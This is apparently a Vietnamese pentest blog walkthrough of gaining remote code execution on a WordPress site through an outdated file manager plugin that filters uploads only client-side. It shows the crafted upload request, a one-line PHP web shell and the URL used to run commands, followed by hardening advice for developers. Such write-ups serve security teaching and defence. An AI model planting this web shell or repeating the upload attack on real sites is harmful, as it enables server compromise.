---
title: "Từ file manager đến RCE: khai thác WordPress plugin lỗi thời"
date: 2026-01-28T20:00:00+07:00
draft: false
description: "Walkthrough khai thác RCE trên WordPress thông qua plugin file manager bị lộ upload."
featuredImage: "/img/background.svg"

categories: ["Pentest", "Web Application"]
tags: ["wordpress", "rce", "file-upload", "wp-file-manager"]

showTableOfContents: true
showAuthor: true
showDate: true
showReadingTime: true
---

## 1. Bối cảnh

Target là một site WordPress chạy cho một sự kiện marketing, dùng plugin **file manager** để non-tech user tự upload tài liệu.

Trong bài viết này, mình mô tả lại cách từ một tính năng tưởng như vô hại dẫn tới **Remote Code Execution (RCE)** trên server.

## 2. Recon nhanh

- `wpscan` cho thấy WordPress core hơi cũ nhưng chưa đến mức critical.
- Điểm thú vị là plugin **File Manager** với version đã có **known exploits** trên Exploit-DB.
- Directory listing bị tắt, nhưng chức năng **upload** hoạt động bình thường.

## 3. Phân tích tính năng upload

Từ giao diện file manager:

- Cho phép upload `.zip`, `.pdf`, `.docx`, nhưng **client-side only**.
- Không có dấu hiệu filter rõ ràng ở phía server.

Mình capture request bằng **Burp Suite**:

```http
POST /wp-admin/admin-ajax.php?action=upload_file HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY
...
------BOUNDARY
Content-Disposition: form-data; name="file"; filename="note.php"
Content-Type: application/x-php
```

Response trả về `200 OK` với path lưu file trong thư mục public.

## 4. Từ upload đến thực thi mã

Sau khi upload `note.php`, mình thử truy cập trực tiếp:

```text
https://target.com/wp-content/uploads/file-manager/note.php
```

Kết quả: code PHP được thực thi.  
Từ đây, mình nâng cấp lên **web shell đơn giản**:

```php
<?php system($_GET["cmd"]); ?>
```

Và chạy:

```text
https://target.com/wp-content/uploads/file-manager/shell.php?cmd=id
```

Trả về user đang chạy web server → **RCE confirmed**.

## 5. Khuyến nghị cho team dev / ops

- Không dùng plugin **file manager** trên production, đặc biệt là bản crack hoặc bản không còn được maintain.
- Nếu bắt buộc phải dùng, hãy:
  - Giới hạn **MIME type** và **extension** ở server-side.
  - Lưu file trên storage **không thực thi được** (no-exec).
  - Tách hẳn **upload domain** (CDN / static domain).

## 6. Bài học rút ra

Chỉ một tính năng “tiện dụng” cho user nội bộ có thể trở thành **entry point** cho attacker nếu:

- Không hiểu rõ **threat model**.
- Áp dụng plugin “cho nhanh” thay vì thiết kế bài bản.

Ở các bài sau, mình sẽ đi sâu hơn vào **hardening WordPress**, cách triệt tiêu bề mặt tấn công kiểu này.

